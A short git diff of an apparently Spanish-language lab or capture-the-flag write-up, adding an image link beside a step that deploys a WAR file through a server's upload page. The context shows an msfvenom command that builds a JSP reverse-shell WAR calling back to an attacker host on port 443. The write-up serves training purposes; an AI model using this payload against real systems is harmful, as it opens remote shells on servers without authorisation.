@@ -25,6 +25,9 @@ encontramos la parte de WAR file to deploy, donde se suben archivos .war
 
 para poder tener una conexión RCE utilizamos: msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
 que nos creara un archivo .war con el contenido dentro.
+
+![image](https://github.com/user-attachments/assets/59d9e8d0-98c2-4969-b196-740739bed25c)
+
 lo lanzamos y nos crea un:   revshell.war
 ![[generado.png]]
 
